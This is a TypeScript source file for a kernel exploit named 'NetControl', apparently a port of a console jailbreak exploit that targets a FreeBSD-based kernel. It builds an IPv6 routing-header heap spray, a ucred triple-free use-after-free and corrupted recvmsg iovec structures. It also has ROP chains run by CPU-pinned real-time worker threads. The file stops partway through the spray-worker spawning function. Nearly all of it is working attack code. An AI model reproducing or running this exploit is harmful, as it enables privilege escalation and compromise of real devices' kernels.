// ============================================================================
// NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
// ============================================================================
import { fn, syscalls, BigInt, mem, gadgets, utils } from 'download0/types'
import { libc_addr } from 'download0/userland'

include('userland.js')

utils.notify('ð\x9F\x92\xA9 NetControl ð\x9F\x92\xA9')

// Socket constants (FreeBSD)
const AF_UNIX = 1
const AF_INET6 = 28
const SOCK_STREAM = 1
const IPPROTO_IPV6 = 41

// IPv6 socket option constants
const IPV6_RTHDR = 51
const IPV6_RTHDR_TYPE_0 = 0

// Spray parameters
const UCRED_SIZE = 0x168
const MSG_HDR_SIZE = 0x30
const IOV_SIZE = 0x10
const MSG_IOV_NUM = 0x17
const IPV6_SOCK_NUM = 128  // Matching Poops.java
const RTHDR_TAG = 0x13370000

// Retry parameters
const TWIN_TRIES = 10
const UAF_TRIES = 50000   // Matching Poops.java
// Infinite retries - will loop until twins are found

// NetControl constants
const NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
const NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007

// Check required syscalls are available
const required_syscalls = [
  { num: 0x03, name: 'read' },
  { num: 0x04, name: 'write' },
  { num: 0x06, name: 'close' },
  { num: 0x17, name: 'setuid' },
  { num: 0x29, name: 'dup' },
  { num: 0x1B, name: 'recvmsg' },
  { num: 0x61, name: 'socket' },
  { num: 0x63, name: 'netcontrol' },
  { num: 0x69, name: 'setsockopt' },
  { num: 0x76, name: 'getsockopt' },
  { num: 0x87, name: 'socketpair' }
]

const missing = []
for (let i = 0; i < required_syscalls.length; i++) {
  if (!syscalls.map.has(required_syscalls[i]!.num)) {
    missing.push(required_syscalls[i]!.name)
  }
}

if (missing.length > 0) {
  log('ERROR: Required syscalls not found: ' + missing.join(', '))
  throw new Error('Required syscalls not found')
}

// ============================================================================
// STAGE 1: Setup - Create IPv6 sockets and initialize pktopts
// ============================================================================

log('=== NetControl ===')

// Register syscall wrappers using fn.register()
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint')
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint')
fn.register(0x69, 'setsockopt', ['number', 'number', 'number', 'bigint', 'number'], 'bigint')
fn.register(0x76, 'getsockopt', ['number', 'number', 'number', 'bigint', 'bigint'], 'bigint')
fn.register(0x06, 'close_sys', ['number'], 'bigint')
fn.register(0x29, 'dup_sys', ['number'], 'bigint')
fn.register(0x1B, 'recvmsg', ['number', 'bigint', 'number'], 'bigint')

// Use syscall number 0x63 for netcontrol
// Note: Java uses dlsym to get __sys_netcontrol wrapper, but fn.register with syscall number
// should call the libkernel wrapper automatically
if (!syscalls.map.has(0x63)) {
  throw new Error('Syscall 0x63 (netcontrol) not found in syscalls.map!')
}
const netcontrol_wrapper = syscalls.map.get(0x63)!
log('netcontrol wrapper address: ' + netcontrol_wrapper.toString())
fn.register(0x63, 'netcontrol_sys', ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
log('Registered netcontrol_sys (syscall 0x63)')

fn.register(0x03, 'read_sys', ['number', 'bigint', 'number'], 'bigint')
fn.register(0x04, 'write_sys', ['number', 'bigint', 'number'], 'bigint')
fn.register(0x17, 'setuid_sys', ['number'], 'bigint')
fn.register(0x14B, 'sched_yield', [], 'bigint')
fn.register(0x1B0, 'thr_self', [], 'bigint')  // FreeBSD uses thr_self, not gettid
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint')

// Create shorthand references
const socket = fn.socket
const socketpair = fn.socketpair
const setsockopt = fn.setsockopt
const getsockopt = fn.getsockopt
const close_sys = fn.close_sys
const dup_sys = fn.dup_sys
const recvmsg = fn.recvmsg
const netcontrol_sys = fn.netcontrol_sys
const read_sys = fn.read_sys
const write_sys = fn.write_sys
const setuid_sys = fn.setuid_sys
const sched_yield = fn.sched_yield
const cpuset_setaffinity = fn.cpuset_setaffinity
const rtprio_thread = fn.rtprio_thread

// Extract syscall wrapper addresses for ROP chains from syscalls.map
const read_wrapper = syscalls.map.get(0x03)!
const write_wrapper = syscalls.map.get(0x04)!
const recvmsg_wrapper = syscalls.map.get(0x1B)!

// Threading using scePthreadCreate
// int32_t scePthreadCreate(OrbisPthread *, const OrbisPthreadAttr *, void*(*F)(void*), void *, const char *)
const scePthreadCreate_addr = libc_addr.add(new BigInt(0, 0x340))
fn.register(scePthreadCreate_addr, 'scePthreadCreate', [], 'bigint')
const scePthreadCreate = fn.scePthreadCreate

log('Using scePthreadCreate at: ' + scePthreadCreate_addr.toString())

// Pre-allocate all buffers once (reuse throughout exploit)
const store_addr = mem.malloc(0x100)
const rthdr_buf = mem.malloc(UCRED_SIZE)
const optlen_buf = mem.malloc(8)

log('store_addr: ' + store_addr.toString())
log('rthdr_buf: ' + rthdr_buf.toString())

// Storage for IPv6 sockets
const ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
let socket_count = 0

log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')

// Create IPv6 sockets using socket()
// Note: socket() auto-throws on error in new API, no need for manual checks
for (let i = 0; i < IPV6_SOCK_NUM; i++) {
  const fd = socket(AF_INET6, SOCK_STREAM, 0)

  // Store as number in Int32Array (handle both BigInt and plain number)
  ipv6_sockets[i] = fd.lo
  socket_count++
}

log('Created ' + socket_count + ' IPv6 sockets')

if (socket_count !== IPV6_SOCK_NUM) {
  log('FAILED: Not all sockets created')
  throw new Error('Failed to create all sockets')
}

log('Initializing pktopts on all sockets...')

// Initialize pktopts by calling setsockopt with NULL buffer
// Note: setsockopt() auto-throws on error, so all calls that don't throw succeeded
for (let i = 0; i < IPV6_SOCK_NUM; i++) {
  setsockopt(ipv6_sockets[i]!, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
}

log('Initialized ' + IPV6_SOCK_NUM + ' pktopts')

// Build IPv6 routing header template
// Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
const rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
mem.view(rthdr_buf).setUint8(0, 0) // ip6r_nxt
mem.view(rthdr_buf).setUint8(1, rthdr_len) // ip6r_len
mem.view(rthdr_buf).setUint8(2, IPV6_RTHDR_TYPE_0) // ip6r_type
mem.view(rthdr_buf).setUint8(3, rthdr_len >> 1) // ip6r_segleft
const rthdr_size = (rthdr_len + 1) << 3

log('Built routing header template (size=' + rthdr_size + ' bytes)')

// ============================================================================
// STAGE 2: Trigger ucred triple-free and find twins/triplet
// ============================================================================

// Allocate buffers
const set_buf = mem.malloc(8)
const clear_buf = mem.malloc(8)
const leak_rthdr_buf = mem.malloc(UCRED_SIZE)
const leak_len_buf = mem.malloc(8)
const tmp_buf = mem.malloc(8)

// Global constiables
const twins = [-1, -1]
const triplets = [-1, -1, -1]
let uaf_sock = -1

// Try socketpair using fn.register() approach
log('Attempting socketpair...')

const sp_buf = mem.malloc(8)
log('Allocated socketpair buffer at: ' + sp_buf.toString())

socketpair(1, 1, 0, sp_buf)

// Extract FD values from buffer (syscalls auto-throw on error)
const iov_ss0 = mem.view(sp_buf).getUint32(0, true)
const iov_ss1 = mem.view(sp_buf).getUint32(4, true)

log('Created socketpair: [' + iov_ss0 + ', ' + iov_ss1 + ']')

// Prepare msg_iov buffer - use valid addresses, kernel will allocate IOV
const iov_recv_buf = mem.malloc(MSG_IOV_NUM * 8)  // Valid buffer for receiving
const msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
for (let i = 0; i < MSG_IOV_NUM; i++) {
  // Point to valid buffer (kernel will allocate IOV structures with iov_base pointing here)
  mem.view(msg_iov).setBigInt(i * IOV_SIZE, iov_recv_buf.add(new BigInt(0, i * 8)), true)
  mem.view(msg_iov).setBigInt(i * IOV_SIZE + 8, new BigInt(0, 8), true)
}

// Prepare msg_hdr for recvmsg
const msg_hdr = mem.malloc(MSG_HDR_SIZE)
mem.view(msg_hdr).setBigInt(0x00, new BigInt(0, 0), true)                 // msg_name
mem.view(msg_hdr).setUint32(0x08, 0, true)                           // msg_namelen
mem.view(msg_hdr).setBigInt(0x10, msg_iov, true)                     // msg_iov
mem.view(msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen (Java uses putLong)
mem.view(msg_hdr).setBigInt(0x20, new BigInt(0, 0), true)                 // msg_control
mem.view(msg_hdr).setUint32(0x28, 0, true)                           // msg_controllen
mem.view(msg_hdr).setUint32(0x2C, 0, true)                           // msg_flags

// Prepare IOV for kernel corruption (iov_base=1 will be interpreted as cr_refcnt)
// Java only sets the FIRST iovec, rest are zeros
const corrupt_msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
mem.view(corrupt_msg_iov).setBigInt(0, new BigInt(0, 1), true)  // iovec[0].iov_base = 1
mem.view(corrupt_msg_iov).setBigInt(8, new BigInt(0, 1), true)  // iovec[0].iov_len = 1
// Rest of iovecs remain zero (default from malloc)

const corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
mem.view(corrupt_msg_hdr).setBigInt(0x00, new BigInt(0, 0), true)         // msg_name
mem.view(corrupt_msg_hdr).setUint32(0x08, 0, true)                   // msg_namelen
mem.view(corrupt_msg_hdr).setBigInt(0x10, corrupt_msg_iov, true)     // msg_iov
mem.view(corrupt_msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen (Java uses putLong)
mem.view(corrupt_msg_hdr).setBigInt(0x20, new BigInt(0, 0), true)         // msg_control
mem.view(corrupt_msg_hdr).setUint32(0x28, 0, true)                   // msg_controllen
mem.view(corrupt_msg_hdr).setUint32(0x2C, 0, true)                   // msg_flags

log('Prepared IOV spray structures')

// ============================================================================
// Persistent Worker Pool (matching Poops.java)
// ============================================================================

const IOV_WORKER_NUM = 4  // Matching Poops.java IOV_THREAD_NUM
const SPRAY_WORKER_NUM = 4  // Multiple spray workers to flood allocator from different CPUs
const setsockopt_wrapper = syscalls.map.get(0x69)!
const getsockopt_wrapper = syscalls.map.get(0x76)!  // getsockopt for twin detection
const sched_yield_wrapper = syscalls.map.get(0x14B)!
const thr_exit_wrapper = syscalls.map.get(0x1AF)!

// Check if cpuset_setaffinity and rtprio_thread exist in syscalls.map
let cpuset_setaffinity_wrapper: BigInt | null = null
if (!syscalls.map.has(0x1E8)) {
  log('WARNING: Syscall 0x1E8 (cpuset_setaffinity) not in map, workers will not be pinned to CPU')
  cpuset_setaffinity_wrapper = null
} else {
  cpuset_setaffinity_wrapper = syscalls.map.get(0x1E8)!
}

let rtprio_thread_wrapper: BigInt | null = null
if (!syscalls.map.has(0x1D2)) {
  log('WARNING: Syscall 0x1D2 (rtprio_thread) not in map, workers will not have realtime priority')
  rtprio_thread_wrapper = null
} else {
  rtprio_thread_wrapper = syscalls.map.get(0x1D2)!
}

fn.register(0x1C7, 'thr_new', ['bigint', 'bigint'], 'bigint')
const thr_new = fn.thr_new

// Store socket FDs in native memory for ROP access
const ipv6_sockets_buf = mem.malloc(IPV6_SOCK_NUM * 4)  // 4 bytes per int32
for (let i = 0; i < IPV6_SOCK_NUM; i++) {
  mem.view(ipv6_sockets_buf).setUint32(i * 4, ipv6_sockets[i]!, true)
}
log('IPv6 socket FDs stored at: ' + ipv6_sockets_buf.toString())

interface Worker {
  ctrl_sock0: number
  ctrl_sock1: number
  stack_size: number
  stack: BigInt
  tls: BigInt
  child_tid: BigInt
  parent_tid: BigInt
  thr_param: BigInt
  signal_buf: BigInt
  corrupt_msg_iov: BigInt
  corrupt_msg_hdr: BigInt
  cpumask: BigInt
  rtp: BigInt
  rop_stack_size: number
  rop_stack: BigInt
  saved_rsp: BigInt
  leak_buf?: BigInt
  leak_len_buf?: BigInt
  cpu?: number
  socket_data_array: BigInt
}

// Worker pool - each worker has its own resources
const workers: Worker[] = []
for (let w = 0; w < IOV_WORKER_NUM; w++) {
  const worker: Worker = {} as Worker

  // Control socketpair for signaling this worker
  const ctrl_sp_buf = mem.malloc(8)
  socketpair(1, 1, 0, ctrl_sp_buf)
  worker.ctrl_sock0 = mem.view(ctrl_sp_buf).getUint32(0, true)
  worker.ctrl_sock1 = mem.view(ctrl_sp_buf).getUint32(4, true)

  // Worker resources
  worker.stack_size = 0x1000
  worker.stack = mem.malloc(worker.stack_size)
  worker.tls = mem.malloc(0x40)
  worker.child_tid = mem.malloc(8)
  worker.parent_tid = mem.malloc(8)
  worker.thr_param = mem.malloc(0x80)
  worker.signal_buf = mem.malloc(1)

  // Each worker gets its own corrupt_msg_iov and corrupt_msg_hdr to avoid race conditions
  worker.corrupt_msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
  mem.view(worker.corrupt_msg_iov).setBigInt(0, new BigInt(0, 1), true)  // iovec[0].iov_base = 1
  mem.view(worker.corrupt_msg_iov).setBigInt(8, new BigInt(0, 1), true)  // iovec[0].iov_len = 1
  // Rest of iovecs remain zero

  worker.corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
  mem.view(worker.corrupt_msg_hdr).setBigInt(0x00, new BigInt(0, 0), true)         // msg_name
  mem.view(worker.corrupt_msg_hdr).setUint32(0x08, 0, true)                   // msg_namelen
  mem.view(worker.corrupt_msg_hdr).setBigInt(0x10, worker.corrupt_msg_iov, true)  // msg_iov
  mem.view(worker.corrupt_msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen
  mem.view(worker.corrupt_msg_hdr).setBigInt(0x20, new BigInt(0, 0), true)         // msg_control
  mem.view(worker.corrupt_msg_hdr).setUint32(0x28, 0, true)                   // msg_controllen
  mem.view(worker.corrupt_msg_hdr).setUint32(0x2C, 0, true)                   // msg_flags

  // CPU affinity structures for this worker (matching Poops.java IovThread)
  worker.cpumask = mem.malloc(0x10)
  mem.view(worker.cpumask).setBigInt(0, new BigInt(0, 0), true)
  mem.view(worker.cpumask).setBigInt(8, new BigInt(0, 0), true)
  mem.view(worker.cpumask).setUint16(0, 1 << 4, true)  // Pin to CPU 4

  // Realtime priority structure for this worker
  worker.rtp = mem.malloc(4)
  mem.view(worker.rtp).setUint16(0, 2, true)    // RTP_PRIO_REALTIME
  mem.view(worker.rtp).setUint16(2, 256, true)  // priority 256

  // Separate ROP stack for infinite looping
  worker.rop_stack_size = 0x2000  // Larger stack for ROP chain
  worker.rop_stack = mem.malloc(worker.rop_stack_size)
  worker.saved_rsp = mem.malloc(8)  // Save initial RSP for pivoting back

  workers.push(worker)
}

log('Created ' + IOV_WORKER_NUM + ' IOV worker slots')

// Twin search result buffer - worker writes twins here
const twin_result_buf = mem.malloc(16)  // [found (4 bytes), twin0 (4 bytes), twin1 (4 bytes), padding]
mem.view(twin_result_buf).setUint32(0, 0, true)  // found = 0
mem.view(twin_result_buf).setUint32(4, 0xffffffff, true)  // twin0 = -1
mem.view(twin_result_buf).setUint32(8, 0xffffffff, true)  // twin1 = -1

// Twin search worker - pre-spawned, waits for signal, does spray-and-check in ROP
const twin_worker: Worker = {} as Worker

// Allocate twin worker resources
const twin_ctrl_sp = mem.malloc(8)
socketpair(1, 1, 0, twin_ctrl_sp)
twin_worker.ctrl_sock0 = mem.view(twin_ctrl_sp).getUint32(0, true)
twin_worker.ctrl_sock1 = mem.view(twin_ctrl_sp).getUint32(4, true)
twin_worker.stack_size = 0x4000
twin_worker.stack = mem.malloc(twin_worker.stack_size)
twin_worker.tls = mem.malloc(0x40)
twin_worker.child_tid = mem.malloc(8)
twin_worker.parent_tid = mem.malloc(8)
twin_worker.thr_param = mem.malloc(0x80)
twin_worker.signal_buf = mem.malloc(1)
twin_worker.rop_stack_size = 0x40000  // 256KB (10 passes × 128 sockets)
twin_worker.rop_stack = mem.malloc(twin_worker.rop_stack_size)
twin_worker.leak_buf = mem.malloc(UCRED_SIZE)
twin_worker.leak_len_buf = mem.malloc(8)

// CPU affinity - pin to CPU 5 for isolation
twin_worker.cpumask = mem.malloc(0x10)
mem.view(twin_worker.cpumask).setBigInt(0, new BigInt(0, 0), true)
mem.view(twin_worker.cpumask).setBigInt(8, new BigInt(0, 0), true)
mem.view(twin_worker.cpumask).setUint16(0, 1 << 5, true)

// Realtime priority
twin_worker.rtp = mem.malloc(4)
mem.view(twin_worker.rtp).setUint16(0, 2, true)
mem.view(twin_worker.rtp).setUint16(2, 768, true)  // Very high priority

log('Twin search worker resources allocated')

// Spray workers for rapid pktopts allocation AND twin detection
const spray_workers: Worker[] = []
for (let w = 0; w < SPRAY_WORKER_NUM; w++) {
  const worker: Worker = {} as Worker

  // Control socketpair for signaling this worker
  const ctrl_sp_buf = mem.malloc(8)
  socketpair(1, 1, 0, ctrl_sp_buf)
  worker.ctrl_sock0 = mem.view(ctrl_sp_buf).getUint32(0, true)
  worker.ctrl_sock1 = mem.view(ctrl_sp_buf).getUint32(4, true)

  // Worker resources
  worker.stack_size = 0x4000  // Larger stack for unrolled loop
  worker.stack = mem.malloc(worker.stack_size)
  worker.tls = mem.malloc(0x40)
  worker.child_tid = mem.malloc(8)
  worker.parent_tid = mem.malloc(8)
  worker.thr_param = mem.malloc(0x80)
  worker.signal_buf = mem.malloc(1)

  // Buffers for getsockopt in ROP
  worker.leak_buf = mem.malloc(UCRED_SIZE)
  worker.leak_len_buf = mem.malloc(8)

  // CPU affinity for this worker - spread across CPUs 1,2,3,5
  worker.cpumask = mem.malloc(0x10)
  mem.view(worker.cpumask).setBigInt(0, new BigInt(0, 0), true)
  mem.view(worker.cpumask).setBigInt(8, new BigInt(0, 0), true)
  const cpu_map = [1, 2, 3, 5]  // Avoid CPU 4 (main thread) and CPU 0 (system)
  worker.cpu = cpu_map[w % cpu_map.length]
  mem.view(worker.cpumask).setUint16(0, 1 << worker.cpu!, true)

  // Realtime priority
  worker.rtp = mem.malloc(4)
  mem.view(worker.rtp).setUint16(0, 2, true)    // RTP_PRIO_REALTIME
  mem.view(worker.rtp).setUint16(2, 512, true)  // Higher priority 512

  // Separate ROP stack
  worker.rop_stack_size = 0x20000  // Much larger - full twin search in ROP!
  worker.rop_stack = mem.malloc(worker.rop_stack_size)

  spray_workers.push(worker)
}

log('Created ' + SPRAY_WORKER_NUM + ' spray worker slots')

// Build ROP chain for twin search worker: spray and check in tight ROP loop
function buildTwinSearchROP () {
  const rop = []
  const SEARCH_PASSES = 50  // Do 50 spray-and-check passes in pure ROP

  // Pin to CPU 5
  if (cpuset_setaffinity_wrapper !== null) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(new BigInt(0, 3))
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(0, 1))
    rop.push(gadgets.POP_RDX_RET)
    rop.push(new BigInt(0xffffffff, 0xffffffff))
    rop.push(gadgets.POP_RCX_RET)
    rop.push(new BigInt(0, 0x10))
    rop.push(gadgets.POP_R8_RET)
    rop.push(twin_worker.cpumask)
    rop.push(cpuset_setaffinity_wrapper)
  }

  // Set realtime priority
  if (rtprio_thread_wrapper !== null) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(new BigInt(0, 1))
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(0, 0))
    rop.push(gadgets.POP_RDX_RET)
    rop.push(twin_worker.rtp)
    rop.push(rtprio_thread_wrapper)
  }

  // Wait for signal to start
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(twin_worker.ctrl_sock0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(twin_worker.signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 1))
  rop.push(read_wrapper)

  // Allocate buffer array for all socket data (128 sockets × 8 bytes each)
  const socket_data_array = mem.malloc(IPV6_SOCK_NUM * 8)
  const check_len = mem.malloc(4)

  // Initialize check_len to 8 bytes (done in JavaScript before ROP runs)
  mem.view(check_len).setUint32(0, 8, true)

  // Do spray passes - many passes for better race chance
  const ROP_SPRAY_PASSES = 10  // Reduced to prevent kernel panic
  for (let pass = 0; pass < ROP_SPRAY_PASSES; pass++) {
    // Spray all 128 sockets
    for (let i = 0; i < IPV6_SOCK_NUM; i++) {
      rop.push(gadgets.POP_RDI_RET)
      rop.push(new BigInt(0, ipv6_sockets[i]!))
      rop.push(gadgets.POP_RSI_RET)
      rop.push(new BigInt(0, IPPROTO_IPV6))
      rop.push(gadgets.POP_RDX_RET)
      rop.push(new BigInt(0, IPV6_RTHDR))
      rop.push(gadgets.POP_RCX_RET)
      rop.push(rthdr_buf)
      rop.push(gadgets.POP_R8_RET)
      rop.push(new BigInt(0, rthdr_size))
      rop.push(setsockopt_wrapper)
    }
  }

  // After spraying, read all sockets into buffer array
  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(new BigInt(0, ipv6_sockets[i]!))
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(0, IPPROTO_IPV6))
    rop.push(gadgets.POP_RDX_RET)
    rop.push(new BigInt(0, IPV6_RTHDR))
    rop.push(gadgets.POP_RCX_RET)
    rop.push(socket_data_array.add(new BigInt(0, i * 8)))  // Offset for socket i
    rop.push(gadgets.POP_R8_RET)
    rop.push(check_len)
    rop.push(getsockopt_wrapper)
  }

  // Signal completion
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(twin_worker.ctrl_sock1))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(twin_worker.signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 1))
  rop.push(write_wrapper)

  // Exit
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(0, 0))
  rop.push(thr_exit_wrapper)

  // Return both ROP chain and socket data buffer
  return {
    rop,
    socket_data_array
  }
}

// Build ROP chain for spray worker: MULTIPLE rapid spray passes
// With 4 workers, each doing 5 passes = 20 total passes across system
function buildSprayWorkerROP (worker: Worker) {
  const rop = []
  const SPRAY_PASSES = 5  // 5 passes per worker × 4 workers = 20 total passes

  // Pin to assigned CPU: cpuset_setaffinity(3, 1, -1, 0x10, worker.cpumask) - if available
  if (cpuset_setaffinity_wrapper !== null) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(new BigInt(0, 3))  // CPU_LEVEL_WHICH
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(0, 1))  // CPU_WHICH_TID
    rop.push(gadgets.POP_RDX_RET)
    rop.push(new BigInt(0xffffffff, 0xffffffff))  // id = -1
    rop.push(gadgets.POP_RCX_RET)
    rop.push(new BigInt(0, 0x10))  // setsize
    rop.push(gadgets.POP_R8_RET)
    rop.push(worker.cpumask)
    rop.push(cpuset_setaffinity_wrapper)
  }

  // Set realtime priority: rtprio_thread(1, 0, worker.rtp) - if available
  if (rtprio_thread_wrapper !== null) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(new BigInt(0, 1))  // RTP_SET
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(0, 0))  // lwpid = 0
    rop.push(gadgets.POP_RDX_RET)
    rop.push(worker.rtp)
    rop.push(rtprio_thread_wrapper)
  }

  // Do multiple spray passes - unrolled for MAXIMUM SPEED
  for (let pass = 0; pass < SPRAY_PASSES; pass++) {
    // Each pass sprays all 128 sockets
    for (let i = 0; i < IPV6_SOCK_NUM; i++) {
      const sock_fd = ipv6_sockets[i]!
      rop.push(gadgets.POP_RDI_RET)
      rop.push(new BigInt(0, sock_fd))  // socket FD
      rop.push(gadgets.POP_RSI_RET)
      rop.push(new BigInt(0, IPPROTO_IPV6))  // level = 41
      rop.push(gadgets.POP_RDX_RET)
      rop.push(new BigInt(0, IPV6_RTHDR))  // optname = 51
      rop.push(gadgets.POP_RCX_RET)
      rop.push(rthdr_buf)  // optval
      rop.push(gadgets.POP_R8_RET)
      rop.push(new BigInt(0, rthdr_size))  // optlen
      rop.push(setsockopt_wrapper)
    }
    // Small yield between passes to let kernel process
    if (pass < SPRAY_PASSES - 1) {
      rop.push(sched_yield_wrapper)
    }
  }

  // Exit thread cleanly: thr_exit(0)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(0, 0))  // exit status
  rop.push(thr_exit_wrapper)

  return rop
}

// Build ROP chain for IOV worker: infinite loop with stack pivoting
// Each worker has its own ROP stack that gets restored after each iteration
function buildWorkerROP (worker: Worker) {
  const rop = []

  // Pin to CPU 4: cpuset_setaffinity(3, 1, -1, 0x10, worker.cpumask) - if available
  if (cpuset_setaffinity_wrapper !== null) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(new BigInt(0, 3))  // CPU_LEVEL_WHICH
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(0, 1))  // CPU_WHICH_TID
    rop.push(gadgets.POP_RDX_RET)
    rop.push(new BigInt(0xffffffff, 0xffffffff))  // id = -1
    rop.push(gadgets.POP_RCX_RET)
    rop.push(new BigInt(0, 0x10))  // setsize
    rop.push(gadgets.POP_R8_RET)
    rop.push(worker.cpumask)
    rop.push(cpuset_setaffinity_wrapper)
  }

  // Set realtime priority: rtprio_thread(1, 0, worker.rtp) - if available
  if (rtprio_thread_wrapper !== null) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(new BigInt(0, 1))  // RTP_SET
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(0, 0))  // lwpid = 0
    rop.push(gadgets.POP_RDX_RET)
    rop.push(worker.rtp)
    rop.push(rtprio_thread_wrapper)
  }

  // Calculate loop start address
  const rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
  // Count gadgets above: cpuset (10 if available) + rtprio (7 if available)
  let setup_gadgets = 0
  if (cpuset_setaffinity_wrapper !== null) setup_gadgets += 10
  if (rtprio_thread_wrapper !== null) setup_gadgets += 7
  const loop_start_offset = setup_gadgets * 8
  const loop_start_rsp = rop_stack_top.sub(new BigInt(0, loop_start_offset))

  // LOOP START - workers return here after pivoting
  // Wait for work signal: read(ctrl_sock0, buf, 1) - blocks until signaled
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(worker.ctrl_sock0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(worker.signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 1))
  rop.push(read_wrapper)

  // Do work: recvmsg(iov_ss0, worker.corrupt_msg_hdr, 0)
  // Allocates IOV in kernel, blocks until data arrives
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(iov_ss0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(worker.corrupt_msg_hdr)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 0))
  rop.push(recvmsg_wrapper)

  // Signal work done: write(ctrl_sock1, buf, 1)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(worker.ctrl_sock1))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(worker.signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 1))
  rop.push(write_wrapper)

  // Pivot RSP back to loop start and continue
  rop.push(gadgets.POP_RSP_RET)
  rop.push(loop_start_rsp)  // RSP = loop start, next RET goes to read()

  return rop
}

// Spawn a worker thread (only called once - workers loop via stack pivoting)
function spawnWorker (worker_idx: number) {
  const worker = workers[worker_idx]
  if (worker === undefined) {
    throw new Error('Invalid worker index: ' + worker_idx)
  }

  // Reset TID values
  mem.view(worker.child_tid).setBigInt(0, new BigInt(0, 0), true)
  mem.view(worker.parent_tid).setBigInt(0, new BigInt(0, 0), true)

  // Build and write ROP chain to dedicated ROP stack
  const rop = buildWorkerROP(worker)
  let rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
  for (let i = rop.length - 1; i >= 0; i--) {
    rop_stack_top = rop_stack_top.sub(new BigInt(0, 8))
    mem.view(rop_stack_top).setBigInt(0, rop[i]!, true)
  }

  // Write pivot target to thread's initial stack
  // Thread starts with RSP = stack + stack_size, so write at top of stack
  const initial_stack_top = worker.stack.add(new BigInt(0, worker.stack_size))
  const pivot_stack = initial_stack_top.sub(new BigInt(0, 8))
  mem.view(pivot_stack).setBigInt(0, rop_stack_top, true)  // Value for POP_RSP_RET

  // Setup thr_param
  mem.view(worker.thr_param).setBigInt(0x00, gadgets.POP_RSP_RET, true)  // Entry: pop RSP (pivots to ROP stack)
  mem.view(worker.thr_param).setBigInt(0x08, new BigInt(0, 0), true)
  mem.view(worker.thr_param).setBigInt(0x10, worker.stack, true)
  mem.view(worker.thr_param).setBigInt(0x18, new BigInt(0, worker.stack_size), true)
  mem.view(worker.thr_param).setBigInt(0x20, worker.tls, true)
  mem.view(worker.thr_param).setBigInt(0x28, new BigInt(0, 0x40), true)
  mem.view(worker.thr_param).setBigInt(0x30, worker.child_tid, true)
  mem.view(worker.thr_param).setBigInt(0x38, worker.parent_tid, true)

  return thr_new(worker.thr_param, new BigInt(0, 0x68))
}

// Spawn spray worker (only called once - worker loops via stack pivoting)
function spawnSprayWorker (worker_idx: number) {
  const worker = spray_workers[worker_idx]
  if (worker === undefined) {
    throw new Error('Invalid spray worker index: ' + worker_idx)
  }

  // Reset TID values
  mem.view(worker.child_tid).setBigInt(0, new BigInt(0, 0), true)
  mem.view(worker.parent_tid).setBigInt(0, new BigInt(0, 0), true)

  // Build and write ROP chain to dedicated ROP stack
  const rop = buildSprayWorkerROP(worker)
  log('  Spray worker ROP chain size: ' + rop.length + ' gadgets (' + (rop.length * 8) + ' bytes)')

  if (rop.length * 8 > worker.rop_stack_size) {
    throw new Error('Spray worker ROP chain too large! ' + (rop.length * 8) + ' > ' + worker.rop_stack_size)
  }

  let rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
